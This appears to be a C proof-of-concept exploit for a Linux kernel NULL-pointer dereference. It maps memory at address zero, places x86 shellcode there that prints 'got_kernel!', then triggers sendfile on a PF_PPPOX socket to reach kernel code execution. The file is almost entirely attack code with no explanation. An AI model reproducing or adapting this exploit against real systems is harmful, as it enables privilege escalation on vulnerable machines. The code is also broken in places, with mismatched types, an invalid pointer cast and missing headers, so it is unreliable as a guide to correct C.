#include <stdio.h>
#include <sys/socket.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

int main() {
	void *mem;
	char template[] = "/tmp/fileXXXXXX";
	int fdin = mkstemp(template);
	int fdout = socket(PF_PPPOX, SOCK_DGRAM, 0);
	int i;

	mem = mmap(NULL, 64, PROT_READ | PROT_WRITE, 
				MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);

	printf("mmap=%x\n", mem);

	char *shellcode[] = 
			"\x31\xdb\xf7\xe3\xb0\x04\x43\xeb\x0a\x59"
			"\xb2\x1d\xcd\x80\xb0\x01\x4b\xcd\x80\xe8"
			"\xf1\xff\xff\xffgot_kernel!\a\n";

	for(i=0; i<36; i++)
		(char*)mem[i] = shellcode[i];
	
	printf("fdin=%d\n", fdin);
	printf("fdout=%d\n", fdout);
	printf("%d\n", unlink(template));
	printf("%d\n", ftruncate(fdin, PAGE_SIZE));
	printf("%d\n", sendfile(fdout, fdin, NULL, PAGE_SIZE));

	return 0;
}
